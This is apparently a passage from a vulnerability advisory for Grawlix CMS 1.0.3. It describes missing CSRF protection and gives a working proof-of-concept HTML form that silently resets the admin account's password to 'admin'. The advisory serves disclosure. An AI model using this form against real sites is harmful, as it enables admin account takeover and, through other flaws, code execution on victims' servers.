2. Overview

CVSS

Medium 5.1 AV:N/AC:H/Au:N/C:P/I:P/A:P

Description

Grawlix is a CMS for publishing comics, which is written in PHP. In version
1.0.3, it does not have CSRF protection, which means that an attacker can
perform actions for a victim, if the victim visits an attacker controlled site
while logged in.

An attacker can for example change the password of an existing admin account,
which may in turn lead to code execution via a different vulnerability in the
admin area.

3. Proof of Concept

Change admin password:


<html>
  <body>
    <form action="http://localhost/grawlix-1.0.3/grawlix-1.0.3/_admin/user.config.php" method="POST">
      <input type="hidden" name="username[1]" value="admin" />
      <input type="hidden" name="email[1]" value="admin@example.com" />
      <input type="hidden" name="password[1]" value="admin" />
      <input type="hidden" name="confirm_password[1]" value="admin" />
      <input type="hidden" name="submit" value="save" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
